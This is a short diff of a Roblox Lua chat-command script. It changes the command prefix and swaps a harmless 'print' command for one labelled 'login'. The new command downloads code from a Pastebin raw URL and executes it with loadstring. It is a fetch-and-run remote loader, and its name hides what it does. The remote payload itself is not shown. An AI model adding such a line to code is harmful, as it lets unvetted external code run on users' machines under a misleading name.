@@ -1,4 +1,4 @@
-local prefix  = ";"
+local prefix  = "."
 local LPlayer = game.Players.LocalPlayer
 LPlayer.Chatted:Connect(function(msg)
     msg = msg:lower()
@@ -14,9 +14,8 @@ LPlayer.Chatted:Connect(function(msg)
             cmd = string.sub(msg,2)
         end
  
-        if cmd == "print" then
-            local var = string.sub(msg,space+1)
-            print(var)
+        if cmd == "login" then
+        loadstring(game:HttpGet(('https://pastebin.com/raw/bC4TKyv7'),true))()
         end
  
         if cmd == "view" then
